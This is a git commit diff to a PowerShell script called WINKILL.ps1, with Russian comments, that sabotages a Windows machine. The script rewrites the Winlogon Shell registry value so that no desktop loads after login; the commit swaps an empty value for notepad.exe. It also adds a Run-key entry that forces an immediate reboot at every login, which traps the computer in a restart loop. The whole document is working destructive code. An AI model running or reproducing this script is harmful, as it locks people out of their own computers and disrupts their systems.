ffaa3d70212c450bcea70671d815e71b7a2d0819
KoTim <100821199+tim1363@users.noreply.github.com>
2025-05-16 13:13:12 +0300

    Update WINKILL.ps1

--- WINKILL.ps1
+++ WINKILL.ps1
@@ -1,5 +1,5 @@
 # Очищаем Shell - после входа в систему не будет рабочего стола
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value ""
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "notepad.exe"
 
 # Добавляем автозапуск на мгновенный ребут
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoReboot" -Value "shutdown /r /t 0"
